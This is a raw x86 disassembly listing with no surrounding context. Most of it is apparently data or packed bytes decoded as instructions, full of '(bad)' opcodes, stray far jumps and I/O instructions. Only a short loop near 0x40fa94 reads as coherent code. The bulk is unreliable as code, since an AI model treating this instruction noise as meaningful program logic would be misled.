  40f594:	call   0xc32af31f
  40f599:	push   ebp
  40f59a:	jmp    0x43f8:0xd892fdd6
  40f5a1:	jecxz  0x40f565
  40f5a3:	movsx  edi,WORD PTR [esi+0x14]
  40f5a7:	cmp    eax,0x6d9cdbc0
  40f5ac:	sub    ebx,eax
  40f5ae:	shl    BYTE PTR [ebp+0x39a06b0],0x68
  40f5b5:	and    bl,BYTE PTR [ebp-0x64]
  40f5b8:	push   ebp
  40f5b9:	int3   
  40f5ba:	mov    eax,ds:0x15ad235d
  40f5bf:	mov    cl,0x12
  40f5c1:	inc    esi
  40f5c2:	dec    eax
  40f5c3:	inc    esp
  40f5c4:	add    al,0xaf
  40f5c6:	(bad)  
  40f5c7:	lods   eax,DWORD PTR cs:[esi]
  40f5c9:	xchg   ecx,eax
  40f5ca:	fidiv  DWORD PTR [ebx+0x62792264]
  40f5d0:	lods   eax,DWORD PTR ds:[esi]
  40f5d1:	sbb    DWORD PTR [esp+edx*4],eax
  40f5d4:	mov    bh,0x3e
  40f5d6:	(bad)  
  40f5d7:	scas   al,BYTE PTR es:[edi]
  40f5d8:	inc    edx
  40f5d9:	scas   al,BYTE PTR es:[edi]
  40f5da:	icebp  
  40f5db:	das    
  40f5dc:	arpl   WORD PTR [edi+0x7d17db2a],si
  40f5e2:	push   es
  40f5e3:	pushf  
  40f5e4:	pop    ds
  40f5e5:	push   cs
  40f5e6:	jo     0x40f5e9
  40f5e8:	mov    WORD PTR [eax],?
  40f5ea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f5eb:	xor    dl,BYTE PTR [esi-0x38]
  40f5ee:	cmp    al,0x5d
  40f5f0:	push   edx
  40f5f1:	jp     0x40f62a
  40f5f3:	(bad)  
  40f5f4:	push   ds
  40f5f5:	and    esi,DWORD PTR [edi]
  40f5f7:	in     al,dx
  40f5f8:	xchg   esp,eax
  40f5f9:	sub    cl,cl
  40f5fb:	xor    cl,BYTE PTR [ecx+0x41]
  40f5fe:	pop    es
  40f5ff:	xchg   esp,eax
  40f600:	jg     0x40f649
  40f602:	pop    eax
  40f603:	inc    ebp
  40f604:	sbb    DWORD PTR [ecx],eax
  40f606:	push   ebx
  40f607:	cmp    BYTE PTR [esi-0x7f8bbe21],dl
  40f60d:	xor    eax,0xd8a3663e
  40f612:	jmp    0x1045adc
  40f617:	in     al,dx
  40f618:	into   
  40f619:	repnz mov edx,0x653c09ec
  40f61f:	popa   
  40f620:	cmp    DWORD PTR [ecx],esp
  40f622:	cmp    DWORD PTR [esi+0x50863725],ebx
  40f628:	sub    esp,0x1e
  40f62b:	gs pop ds
  40f62d:	out    0x77,eax
  40f62f:	out    0x58,eax
  40f631:	sbb    al,BYTE PTR ds:0x7beaf514
  40f637:	adc    BYTE PTR [ecx],ah
  40f639:	or     eax,0x64ff644a
  40f63e:	mov    edx,0x5343175e
  40f643:	in     al,dx
  40f644:	sbb    al,0x3e
  40f646:	sbb    bl,dl
  40f648:	mov    ecx,DWORD PTR [eax-0x78018873]
  40f64e:	mov    bh,0x41
  40f650:	mov    eax,ds
  40f652:	lahf   
  40f653:	jns    0x40f6bd
  40f655:	push   eax
  40f656:	mov    ebp,0xba989283
  40f65b:	sbb    DWORD PTR [ecx-0x204ad5c6],0xe6326d4d
  40f665:	dec    esi
  40f666:	xor    bl,BYTE PTR [ecx]
  40f668:	adc    al,BYTE PTR [eax-0x4d3fd9cc]
  40f66e:	push   edi
  40f66f:	mov    ecx,0xfd49f290
  40f674:	add    bh,BYTE PTR [edx+0x78e94fb7]
  40f67a:	xor    edi,DWORD PTR [ebx+0x6aa4ffa5]
  40f680:	inc    eax
  40f681:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f682:	jge    0x40f620
  40f684:	ret    
  40f685:	jle    0x40f638
  40f687:	mov    ds:0x7d9b883e,eax
  40f68c:	mov    ch,0x4d
  40f68e:	xchg   esp,eax
  40f68f:	xchg   BYTE PTR [ecx+0x6f],al
  40f692:	dec    ebx
  40f693:	mov    ebx,0x952f756b
  40f698:	xlat   BYTE PTR ds:[ebx]
  40f699:	(bad)  
  40f69a:	ss inc edi
  40f69c:	sbb    BYTE PTR [ebx-0x3ceae181],0x78
  40f6a3:	cli    
  40f6a4:	sub    ebx,DWORD PTR [esi+0x14f2461d]
  40f6aa:	jp     0x40f722
  40f6ac:	sub    ebx,edi
  40f6ae:	cli    
  40f6af:	push   ecx
  40f6b0:	cs push ebx
  40f6b2:	and    al,0xe8
  40f6b4:	rcl    BYTE PTR [edx+edx*2-0x175c1ea6],cl
  40f6bb:	iret   
  40f6bc:	loopne 0x40f6ab
  40f6be:	shl    bh,cl
  40f6c0:	mov    ecx,0x6eef0cc5
  40f6c5:	lods   eax,DWORD PTR ds:[esi]
  40f6c6:	popf   
  40f6c7:	mov    WORD PTR [esp+esi*2-0x70b5d945],?
  40f6ce:	jl     0x40f66f
  40f6d0:	out    dx,eax
  40f6d1:	mov    DWORD PTR [ebp+0x61],0x504758d6
  40f6d8:	and    BYTE PTR [ebp+0x4d],ah
  40f6db:	jnp    0x40f685
  40f6dd:	jge    0x40f6a2
  40f6df:	inc    edi
  40f6e0:	inc    ecx
  40f6e1:	push   ds
  40f6e2:	sti    
  40f6e3:	out    dx,al
  40f6e4:	das    
  40f6e5:	jb     0x40f6fe
  40f6e7:	cmp    al,0x81
  40f6e9:	and    cl,bl
  40f6eb:	popa   
  40f6ec:	(bad)  
  40f6ee:	popa   
  40f6ef:	lods   al,BYTE PTR ds:[esi]
  40f6f0:	aam    0x4d
  40f6f2:	xchg   ecx,eax
  40f6f3:	jae    0x40f75e
  40f6f5:	push   ecx
  40f6f6:	jns    0x40f69f
  40f6f8:	into   
  40f6f9:	adc    ecx,esi
  40f6fb:	mov    ds:0xe37eb2e1,al
  40f700:	sub    ebp,edx
  40f702:	hlt    
  40f703:	push   ss
  40f704:	xchg   bl,bh
  40f706:	xlat   BYTE PTR ds:[ebx]
  40f707:	in     eax,dx
  40f708:	fiadd  DWORD PTR [ebp-0x42]
  40f70b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f70c:	or     dh,BYTE PTR [edi+0x5b241f98]
  40f712:	fdivr  DWORD PTR [ebx-0x4f]
  40f715:	fldcw  WORD PTR [ebx+ebp*2]
  40f718:	xchg   BYTE PTR [ebp-0x2604134f],al
  40f71e:	lahf   
  40f71f:	xchg   edx,eax
  40f720:	es stos BYTE PTR es:[edi],al
  40f722:	or     eax,0x19217067
  40f727:	(bad)  
  40f728:	hlt    
  40f729:	add    DWORD PTR [ecx+0x16],ebp
  40f72c:	mov    edi,0xb9384050
  40f731:	adc    bh,0x97
  40f734:	test   eax,0xd163941a
  40f739:	inc    ebp
  40f73a:	xchg   DWORD PTR [edi+esi*4+0x2df9b28b],esi
  40f741:	cmp    eax,0x62f01eca
  40f746:	mov    esp,0xe60981ee
  40f74b:	inc    ebx
  40f74c:	push   esi
  40f74d:	daa    
  40f74e:	retf   
  40f74f:	add    edx,0xffffffdd
  40f752:	xor    dh,BYTE PTR [edi+0x74285ded]
  40f758:	and    esp,DWORD PTR [ebx-0x20ab1b01]
  40f75e:	imul   esi,esp,0x710208fb
  40f764:	fadd   QWORD PTR [ebp-0x11]
  40f767:	add    eax,0x44f6a4f6
  40f76c:	pop    ebp
  40f76d:	xchg   edi,eax
  40f76e:	adc    eax,0x7e0eeb20
  40f773:	data16 repnz mov bh,0xaa
  40f777:	sub    ch,BYTE PTR [ebx-0x18e2b32e]
  40f77d:	(bad)
  40f781:	out    0x5c,al
  40f783:	inc    esp
  40f784:	fnsave [ebx-0x2d]
  40f787:	xchg   DWORD PTR [edx+0x41457a32],ebx
  40f78d:	adc    BYTE PTR [eax+0x22],0x8f
  40f791:	xchg   esp,eax
  40f792:	add    BYTE PTR [esi-0x10],al
  40f795:	imul   edx,DWORD PTR [edi],0xffffffd4
  40f798:	hlt    
  40f799:	loopne 0x40f80a
  40f79b:	lods   eax,DWORD PTR ds:[esi]
  40f79c:	(bad)  
  40f79d:	shr    bh,1
  40f79f:	leave  
  40f7a0:	sub    DWORD PTR [edi-0x56a062e3],ebx
  40f7a6:	mov    ecx,0x420d91aa
  40f7ab:	adc    ah,dl
  40f7ad:	inc    esi
  40f7ae:	popa   
  40f7af:	sbb    DWORD PTR [eax+0x5ca52c13],esp
  40f7b5:	pop    es
  40f7b6:	cmp    eax,0x69cb6dc9
  40f7bb:	sar    BYTE PTR [ecx],cl
  40f7bd:	je     0x40f7cd
  40f7bf:	inc    ecx
  40f7c0:	stc    
  40f7c1:	inc    edx
  40f7c2:	xchg   ebp,eax
  40f7c3:	add    eax,DWORD PTR [ebx]
  40f7c5:	fsub   QWORD PTR [edx+0x22]
  40f7c8:	lahf   
  40f7c9:	ja     0x40f7c2
  40f7cb:	(bad)  
  40f7cc:	fnstsw WORD PTR [edi]
  40f7ce:	js     0x40f76d
  40f7d0:	mov    dl,0x55
  40f7d2:	xchg   esi,eax
  40f7d3:	and    bh,cl
  40f7d5:	loopne 0x40f75a
  40f7d7:	loopne 0x40f83f
  40f7d9:	or     bl,BYTE PTR [edi]
  40f7db:	rcl    esp,cl
  40f7dd:	xchg   ebp,ebp
  40f7df:	dec    esi
  40f7e0:	add    ebx,DWORD PTR [ebx-0x41]
  40f7e3:	fs mov ch,0x40
  40f7e6:	jge    0x40f831
  40f7e8:	add    edx,ecx
  40f7ea:	cmp    edi,edx
  40f7ec:	mov    DWORD PTR ds:0x42a779,0x7d48
  40f7f6:	jmp    0x40fa7e
  40f7fb:	ret    0xc9cd
  40f7fe:	ret    
  40f7ff:	(bad)  
  40f801:	retf   0x10cd
  40f804:	test   BYTE PTR ds:0x3f81805f,ch
  40f80a:	ins    DWORD PTR es:[edi],dx
  40f80b:	and    BYTE PTR [edi+0x78],al
  40f80e:	js     0x40f7f5
  40f810:	jle    0x40f88a
  40f812:	js     0x40f88c
  40f814:	rcl    ebx,1
  40f816:	ss mov bl,0xd5
  40f819:	out    0x47,al
  40f81b:	mov    ch,0x4b
  40f81d:	imul   esp
  40f81f:	inc    ebx
  40f820:	lds    esi,FWORD PTR [edi+0x66]
  40f823:	dec    ebp
  40f824:	int    0x61
  40f826:	pop    esi
  40f827:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f828:	mov    dh,0xf5
  40f82a:	hlt    
  40f82b:	bound  edx,QWORD PTR ds:0xf28cc80a
  40f831:	inc    ecx
  40f832:	pop    es
  40f833:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f834:	jne    0x40f84f
  40f836:	mov    bl,0x74
  40f838:	mov    edi,0x4f98c4ab
  40f83d:	fsub   st(7),st
  40f83f:	and    cl,BYTE PTR [ebp+0x61]
  40f842:	push   cs
  40f843:	jne    0x40f7f2
  40f845:	in     al,dx
  40f846:	mov    ebp,0x6316f505
  40f84b:	sub    al,0x7e
  40f84d:	xchg   edi,eax
  40f84e:	hlt    
  40f84f:	mov    ebx,0x7c888968
  40f854:	sub    DWORD PTR [edi+ebp*2-0x1d1dcc25],0xffffff86
  40f85c:	dec    eax
  40f85d:	test   DWORD PTR [esi+0x72],esi
  40f860:	jecxz  0x40f8b7
  40f862:	out    0x28,eax
  40f864:	gs mov ah,0xe3
  40f867:	scas   eax,DWORD PTR es:[edi]
  40f868:	aaa    
  40f869:	test   eax,0xac9e699e
  40f86e:	add    al,0xf5
  40f870:	cmp    BYTE PTR [ebx-0x39],ah
  40f873:	mov    eax,ds:0xe7e1d193
  40f878:	int3   
  40f879:	push   ebp
  40f87a:	adc    DWORD PTR [esi+0x39a10eb],edx
  40f880:	cld    
  40f881:	mov    BYTE PTR [edx-0x1cbc3e92],ch
  40f887:	and    eax,esp
  40f889:	or     DWORD PTR [ecx],edi
  40f88b:	(bad)  cs:[esi-0x1f2ad546]
  40f892:	dec    edx
  40f893:	push   edi
  40f894:	pop    edi
  40f895:	ret    
  40f896:	push   ebx
  40f897:	mov    ds:0xf73633cd,al
  40f89c:	jg     0x40f856
  40f89e:	cmp    eax,0xe0f0b6ca
  40f8a3:	or     eax,DWORD PTR [edx+ecx*4+0x49]
  40f8a7:	sbb    DWORD PTR [esi+0x1b],esi
  40f8aa:	jmp    0x1a85:0x4cbd8f63
  40f8b1:	jle    0x40f895
  40f8b3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f8b4:	mov    bl,0xfb
  40f8b6:	loop   0x40f8e6
  40f8b8:	add    edx,eax
  40f8ba:	push   0x624200d3
  40f8bf:	jne    0x40f8b2
  40f8c1:	aam    0x1e
  40f8c3:	push   ss
  40f8c4:	inc    ecx
  40f8c5:	or     eax,0xf7796871
  40f8ca:	sbb    eax,0x18ffcbf1
  40f8cf:	and    dh,BYTE PTR [ecx]
  40f8d1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f8d2:	cmp    edi,edi
  40f8d4:	ret    0xa67a
  40f8d7:	repnz clc 
  40f8d9:	ins    DWORD PTR es:[edi],dx
  40f8da:	or     esp,DWORD PTR [esi]
  40f8dc:	(bad)  
  40f8dd:	pop    ds
  40f8de:	jo     0x40f946
  40f8e0:	out    dx,al
  40f8e1:	cmp    al,0x15
  40f8e3:	cli    
  40f8e4:	push   eax
  40f8e5:	mov    ecx,0x26501725
  40f8ea:	add    bl,BYTE PTR [eax]
  40f8ec:	mov    bl,0xa7
  40f8ee:	stos   DWORD PTR es:[edi],eax
  40f8ef:	hlt    
  40f8f0:	sbb    BYTE PTR [ecx],al
  40f8f2:	inc    ecx
  40f8f3:	push   cs
  40f8f4:	or     ecx,ebp
  40f8f6:	(bad)
  40f8f9:	sbb    ch,al
  40f8fb:	or     DWORD PTR [ecx-0x552c2e83],ecx
  40f901:	mov    dl,0xab
  40f903:	pop    es
  40f904:	xchg   ebx,eax
  40f905:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f906:	xor    dl,BYTE PTR [ebp+0x3a572976]
  40f90c:	jl     0x40f8e1
  40f90e:	mov    ds:0x1c09e4a0,al
  40f913:	push   esp
  40f914:	ds das 
  40f916:	cmp    DWORD PTR [ebx-0x16],0x35482ce3
  40f91d:	or     dh,BYTE PTR ds:0xea18511c
  40f923:	stos   BYTE PTR es:[edi],al
  40f924:	lea    edi,[ebx-0x3d]
  40f927:	arpl   WORD PTR ds:0x771de300,ax
  40f92d:	dec    ch
  40f92f:	arpl   WORD PTR [ecx+eax*8],bx
  40f932:	push   eax
  40f933:	loop   0x40f8b7
  40f935:	(bad)  
  40f936:	xlat   BYTE PTR ds:[ebx]
  40f937:	push   ds
  40f938:	mov    ch,0x3b
  40f93a:	es cwde 
  40f93c:	mov    ds:0x3c76d0b6,al
  40f941:	out    dx,eax
  40f942:	test   BYTE PTR [ebx],ah
  40f944:	sub    ebx,edx
  40f946:	jbe    0x40f982
  40f948:	pusha  
  40f949:	mov    ecx,0x636c3c3c
  40f94e:	in     al,dx
  40f94f:	jmp    0x8988b3cd
  40f954:	stos   BYTE PTR es:[edi],al
  40f955:	cmp    ebx,DWORD PTR ds:0xc6caa580
  40f95b:	jmp    0xd13c:0xe8d3157c
  40f962:	mov    ch,0xf9
  40f964:	fcomip st,st(7)
  40f966:	cs dec eax
  40f968:	sbb    ebp,DWORD PTR [esi+0x39373b58]
  40f96e:	pop    ds
  40f96f:	ror    BYTE PTR [edx+edi*8],cl
  40f972:	dec    edi
  40f973:	leave  
  40f974:	mov    ds:0xa86bb7b6,eax
  40f979:	jae    0x40f92e
  40f97b:	pop    es
  40f97c:	repnz mov DWORD PTR [eax+0x756baba4],edx
  40f983:	or     BYTE PTR [eax],ah
  40f985:	fisttp DWORD PTR [edi-0x9c3c674]
  40f98b:	jb     0x40f93f
  40f98d:	push   ds
  40f98e:	ds ret 0x31b
  40f992:	pop    ds
  40f993:	in     eax,0x42
  40f995:	test   al,0x92
  40f997:	add    al,0x1d
  40f999:	enter  0x8ba4,0xe1
  40f99d:	jns    0x40f9cd
  40f99f:	add    eax,0x75c3c4d8
  40f9a4:	push   esp
  40f9a5:	or     DWORD PTR ds:0x8009c03d,0x16
  40f9ac:	cwde   
  40f9ad:	inc    esi
  40f9ae:	jbe    0x40f9e6
  40f9b0:	lahf   
  40f9b1:	test   al,0x4a
  40f9b3:	(bad)  
  40f9b4:	mov    al,0x27
  40f9b6:	repnz dec esi
  40f9b8:	rol    BYTE PTR [ecx],cl
  40f9ba:	pop    ebp
  40f9bb:	pop    ebp
  40f9bc:	in     al,dx
  40f9bd:	fsubrp st(5),st
  40f9bf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f9c0:	mov    edi,DWORD PTR [edx-0x10]
  40f9c3:	inc    ebp
  40f9c4:	lds    ecx,FWORD PTR [ebx-0x18]
  40f9c7:	call   0xea74fcda
  40f9cc:	ins    DWORD PTR es:[edi],dx
  40f9cd:	(bad)  
  40f9ce:	sar    BYTE PTR [esi+0x46],cl
  40f9d1:	xchg   ecx,eax
  40f9d2:	cmp    DWORD PTR [eax-0x4f],eax
  40f9d5:	or     bh,BYTE PTR [eax+0x5a4ca015]
  40f9db:	jo     0x40f977
  40f9dd:	repnz in eax,dx
  40f9df:	adc    BYTE PTR [eax-0x7a3044c9],bl
  40f9e5:	std    
  40f9e6:	call   0x6456:0xd624bd49
  40f9ed:	jo     0x40fa3a
  40f9ef:	sbb    al,0x38
  40f9f1:	cdq    
  40f9f2:	add    bl,BYTE PTR [edx+0x7a]
  40f9f5:	scas   al,BYTE PTR es:[edi]
  40f9f6:	lods   eax,DWORD PTR ds:[esi]
  40f9f7:	repz pop esp
  40f9f9:	or     DWORD PTR [esi-0x3a],esi
  40f9fc:	inc    edx
  40f9fd:	test   eax,ecx
  40f9ff:	ds rol bh,0x46
  40fa03:	jg     0x40f99a
  40fa05:	jmp    0xee60:0x765f9e6c
  40fa0c:	sub    ebx,DWORD PTR [edx+edi*4-0x19a7b213]
  40fa13:	xchg   edx,eax
  40fa14:	mov    fs,WORD PTR [eax+0x2ab41bd5]
  40fa1a:	sti    
  40fa1b:	ds jo  0x40fa6a
  40fa1e:	pop    ecx
  40fa1f:	jns    0x40fa12
  40fa21:	test   BYTE PTR [edi-0x5e],ch
  40fa24:	adc    edi,0x3e4d82cd
  40fa2a:	outs   dx,BYTE PTR ds:[esi]
  40fa2b:	mov    dl,0x75
  40fa2d:	xor    ch,BYTE PTR [ebx+0x470a6e2f]
  40fa33:	mov    edx,0x9a72cd66
  40fa38:	add    eax,0x1764447b
  40fa3d:	xor    eax,0xb54bb6de
  40fa42:	es scas al,BYTE PTR es:[edi]
  40fa44:	push   edi
  40fa45:	into   
  40fa46:	mov    DWORD PTR [edx-0xcfa4de7],edi
  40fa4c:	je     0x40fa82
  40fa4e:	jns    0x40fab2
  40fa50:	icebp  
  40fa51:	call   0xb70a:0xae45584c
  40fa58:	ins    BYTE PTR es:[edi],dx
  40fa59:	jae    0x40f9e7
  40fa5b:	std    
  40fa5c:	cmp    ecx,edx
  40fa5e:	or     edi,DWORD PTR [edi-0x2ec5acc7]
  40fa64:	adc    DWORD PTR [edx-0x378254e3],eax
  40fa6a:	imul   ecx,DWORD PTR [ecx-0x3e],0xbd86ced9
  40fa71:	dec    ecx
  40fa72:	add    edi,ebp
  40fa74:	(bad)  
  40fa75:	and    DWORD PTR ds:0x5c76b88b,edx
  40fa7b:	pop    edi
  40fa7c:	sar    DWORD PTR [ebp+0x53ab840f],1
  40fa82:	add    BYTE PTR [eax],al
  40fa84:	push   ebx
  40fa85:	mov    DWORD PTR ds:0x42a809,0x5779
  40fa8f:	jmp    0x4148fa
  40fa94:	mov    DWORD PTR ds:0x42a7c1,0x1b
  40fa9e:	cmp    DWORD PTR ds:0x42a7c1,0x0
  40faa5:	je     0x40faf7
  40faab:	cmp    DWORD PTR ds:0x42a7c1,0x7
  40fab2:	jne    0x40facb
  40fab8:	push   0x6ecd
  40fabd:	push   0x4c4c
  40fac2:	push   DWORD PTR [ebp-0x1c]
  40fac5:	call   DWORD PTR ds:0x41d1a8
  40facb:	cmp    DWORD PTR ds:0x42a7c1,0x8
  40fad2:	jne    0x40fae5
  40fad8:	mov    edi,DWORD PTR ds:0x42a7c1
  40fade:	dec    edi
  40fadf:	mov    DWORD PTR ds:0x42a7c1,edi
  40fae5:	mov    edi,DWORD PTR ds:0x42a7c1
  40faeb:	dec    edi
  40faec:	mov    DWORD PTR ds:0x42a7c1,edi
  40faf2:	jmp    0x40fa9e
  40faf7:	mov    edx,DWORD PTR [ebp-0x8]
  40fafa:	mov    edi,DWORD PTR [ebp-0x10]
  40fafd:	jmp    0x40fd85
  40fb02:	cmp    eax,0xd9c7c9d6
  40fb07:	fcmovnb st,st(1)
  40fb09:	(bad)  
  40fb0a:	cmc    
  40fb0b:	into   
  40fb0c:	inc    edx
  40fb0d:	jge    0x40fb83
  40fb0f:	sbb    BYTE PTR [esi+0x78458d13],cl
  40fb15:	js     0x40fafc
  40fb17:	jle    0x40fb91
  40fb19:	js     0x40faf2
  40fb1b:	or     al,0x43
  40fb1d:	stos   BYTE PTR es:[edi],al
  40fb1e:	adc    dh,cl
  40fb20:	ss pop ecx
  40fb22:	lock arpl WORD PTR [edx+eiz*4+0x15],di
  40fb27:	xchg   esp,eax
  40fb28:	aaa    
  40fb29:	xlat   BYTE PTR ds:[ebx]
  40fb2a:	jno    0x40fb7c
  40fb2c:	repnz aas 
  40fb2e:	xlat   BYTE PTR ds:[ebx]
  40fb2f:	lods   eax,DWORD PTR ds:[esi]
  40fb30:	jo     0x40fbac
  40fb32:	test   BYTE PTR [edi-0x6b],0x2d
  40fb36:	mov    cx,0xa44b
  40fb3a:	xor    ah,bh
  40fb3c:	jmp    0xd82702d6
  40fb41:	push   esi
  40fb42:	add    BYTE PTR [ecx-0x2613757e],bl
  40fb48:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fb49:	in     al,dx
  40fb4a:	push   ebx
  40fb4b:	retf   
  40fb4c:	add    eax,0xde6b7bdd
  40fb51:	or     BYTE PTR [edi+0x4f7dff5d],bl
  40fb57:	xchg   edi,eax
  40fb58:	mov    ds:0xaed4908b,al
  40fb5d:	mov    bl,0x27
  40fb5f:	xlat   BYTE PTR ds:[ebx]
  40fb60:	or     al,0x5e
  40fb62:	outs   dx,DWORD PTR ds:[esi]
  40fb63:	ja     0x40fbd2
  40fb65:	jae    0x40fbb6
  40fb67:	enter  0xb25d,0x6b
  40fb6b:	mov    bl,0xb3
  40fb6d:	pop    ss
  40fb6e:	mov    bh,0x8
  40fb70:	out    0x29,al
  40fb72:	pusha  
  40fb73:	adc    eax,0xcf36900f
  40fb78:	call   0xdacfcaf
  40fb7d:	outs   dx,BYTE PTR ds:[esi]
  40fb7e:	or     al,0xb8
  40fb80:	js     0x40fbf8
  40fb82:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fb83:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fb84:	popf   
  40fb85:	push   edi
  40fb86:	(bad)  
  40fb87:	xor    eax,0xa97a8631
  40fb8c:	push   edx
  40fb8d:	sbb    eax,0xb7c11a8a
  40fb92:	pusha  
  40fb93:	adc    BYTE PTR [esi-0x48],bh
  40fb96:	les    ebx,FWORD PTR [ebp-0x395497eb]
  40fb9c:	int    0x62
  40fb9e:	mov    cl,0x88
  40fba0:	mov    ?,ecx
  40fba2:	push   esi
  40fba3:	xor    DWORD PTR [edx+eax*2],eax
  40fba6:	xor    eax,0x8a2f4e37
  40fbab:	cmp    eax,0xb7c9f8d6
  40fbb0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fbb1:	pop    esi
  40fbb2:	jno    0x40fbd4
  40fbb4:	test   DWORD PTR [edx-0x25b95ac7],ebx
  40fbba:	iret   
  40fbbb:	mov    eax,0x16e57903
  40fbc0:	test   DWORD PTR [edi+0x66e804ae],0x23b98a19
  40fbca:	ds jg  0x40fc47
  40fbcd:	xor    eax,0x400ff9db
  40fbd2:	dec    ecx
  40fbd3:	inc    eax
  40fbd4:	popa   
  40fbd5:	or     edx,DWORD PTR [ebx]
  40fbd7:	mov    ah,0x58
  40fbd9:	leave  
  40fbda:	loop   0x40fb61
  40fbdc:	push   ebx
  40fbdd:	iret   
  40fbde:	pop    ss
  40fbdf:	and    BYTE PTR [ecx-0x7f],bl
  40fbe2:	or     ebx,DWORD PTR [edx-0x4fc4caaf]
  40fbe8:	bound  edx,QWORD PTR [edi+0x6f212a39]
  40fbee:	mov    ds,WORD PTR [ebp+eax*1+0x84e473b]
  40fbf5:	mov    al,0x59
  40fbf7:	or     bh,BYTE PTR es:[ebp-0x6a]
  40fbfb:	xor    dl,BYTE PTR [eax]
  40fbfd:	mov    eax,0xae20268b
  40fc02:	icebp  
  40fc03:	fist   WORD PTR [edi+0x703ea8e0]
  40fc09:	fisttp DWORD PTR [esi-0x1c]
  40fc0c:	pop    esp
  40fc0d:	add    esi,DWORD PTR [ebp+0x3a942c7f]
  40fc13:	mov    ebp,0xc618a107
  40fc18:	push   ds
  40fc19:	cld    
  40fc1a:	fld    QWORD PTR [eax-0x6d]
  40fc1d:	adc    al,0x77
  40fc1f:	sbb    al,0x42
  40fc21:	sbb    dl,BYTE PTR [edx+esi*4-0x2e]
  40fc25:	or     BYTE PTR [edi+0x78],al
  40fc28:	inc    esp
  40fc29:	xchg   DWORD PTR [ecx],ecx
  40fc2b:	push   es
  40fc2c:	call   0xeb7e:0xd5139df2
  40fc33:	aas    
  40fc34:	pop    ecx
  40fc35:	and    al,0xfb
  40fc37:	clc    
  40fc38:	sbb    ch,ah
  40fc3a:	mov    bl,cl
  40fc3c:	int    0xdb
  40fc3e:	xor    ebp,DWORD PTR [edi-0x3e]
  40fc41:	xchg   BYTE PTR [edi],dh
  40fc43:	mov    al,ds:0xe87db727
  40fc48:	jp     0x40fc2c
  40fc4a:	mov    BYTE PTR [edi+ebx*4-0x17b4f6ae],ah
  40fc51:	add    eax,DWORD PTR [ebp+edi*4+0x64acd5d1]
  40fc58:	jmp    0x7604:0x2823d580
  40fc5f:	in     al,0xf9
  40fc61:	not    DWORD PTR [edx-0x73ce2e54]
  40fc67:	xor    BYTE PTR [edx],0x74
  40fc6a:	jl     0x40fc4a
  40fc6c:	cli    
  40fc6d:	clc    
  40fc6e:	leave  
  40fc6f:	lea    esi,[ebp+0x56]
  40fc72:	leave  
  40fc73:	ins    BYTE PTR es:[edi],dx
  40fc74:	xchg   edx,eax
  40fc75:	hlt    
  40fc76:	sbb    bh,BYTE PTR [ecx]
  40fc78:	mov    esp,0xb026d11
  40fc7d:	clc    
  40fc7e:	mov    ds:0x2f7767b9,al
  40fc83:	add    esp,DWORD PTR [ebp-0x1b3ffe2c]
  40fc89:	nop
  40fc8a:	aaa    
  40fc8b:	sbb    cl,BYTE PTR ds:0xeb6e1d67
  40fc91:	inc    ebp
  40fc92:	jnp    0x40fced
  40fc94:	adc    cl,BYTE PTR [ecx-0x8b546b6]
  40fc9a:	push   eax
  40fc9b:	bound  ecx,QWORD PTR [ecx-0x2042c729]
  40fca1:	push   ss
  40fca2:	pop    ss
  40fca3:	mov    ebp,0x1cf82e5b
  40fca8:	leave  
  40fca9:	arpl   WORD PTR [ebp+0x7950c82],bx
  40fcaf:	aam    0x2c
  40fcb1:	sbb    al,0x32
  40fcb3:	rep repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fcb6:	and    DWORD PTR [edx+0x61],0xffffff8e
  40fcba:	ss pop edx
  40fcbc:	popf   
  40fcbd:	pop    ss
  40fcbe:	and    esi,edi
  40fcc0:	dec    edx
  40fcc1:	popa   
  40fcc2:	pop    esi
  40fcc3:	dec    ecx
  40fcc4:	mov    ebx,0x60f95765
  40fcc9:	jmp    0x123b:0xa40a13e0
  40fcd0:	loop   0x40fd12
  40fcd2:	out    0x2,eax
  40fcd4:	mov    cl,0x86
  40fcd6:	loop   0x40fd07
  40fcd8:	mov    bh,0x13
  40fcda:	pop    edi
  40fcdb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fcdc:	xchg   edi,eax
  40fcdd:	push   cs
  40fcde:	out    dx,eax
  40fcdf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fce0:	mov    eax,0xfddc5ef5
  40fce5:	loopne 0x40fc80
  40fce7:	cmp    al,0x35
  40fce9:	data16 lods al,BYTE PTR ds:[esi]
  40fceb:	rcl    DWORD PTR [ecx-0x24],cl
  40fcee:	shl    DWORD PTR [ebx+eiz*8],cl
  40fcf1:	pop    esi
  40fcf2:	inc    ebp
  40fcf3:	xchg   ecx,eax
  40fcf4:	fst    DWORD PTR ds:0x2755
  40fcf9:	test   bl,bl
  40fcfb:	lock call 0x739b:0x686c19c0
  40fd03:	fucomip st,st(0)
  40fd05:	inc    esp
  40fd06:	lds    esi,FWORD PTR [edx-0x317a06d6]
  40fd0c:	ret    0x7019
  40fd0f:	repnz aas 
  40fd11:	je     0x40fd01
  40fd13:	sbb    DWORD PTR [edi],0xd3a746ba
  40fd19:	imul   esi,DWORD PTR [edx],0xf428e00c
  40fd1f:	sub    DWORD PTR [eax+ebx*4+0x4f],ebx
  40fd23:	aad    0x5d
  40fd25:	add    BYTE PTR [edi],dl
  40fd27:	mov    al,ds:0xb14fc242
  40fd2c:	pop    edi
  40fd2d:	repz sar DWORD PTR [edx-0x3f],cl
  40fd31:	cmp    esp,DWORD PTR [ecx+0x3e]
  40fd34:	lock mov ebx,0x352a68b4
  40fd3a:	hlt    
  40fd3b:	xor    DWORD PTR [ebx+0x32f6c636],0x47006609
  40fd45:	xchg   ecx,eax
  40fd46:	les    esi,FWORD PTR [edi+0x5f]
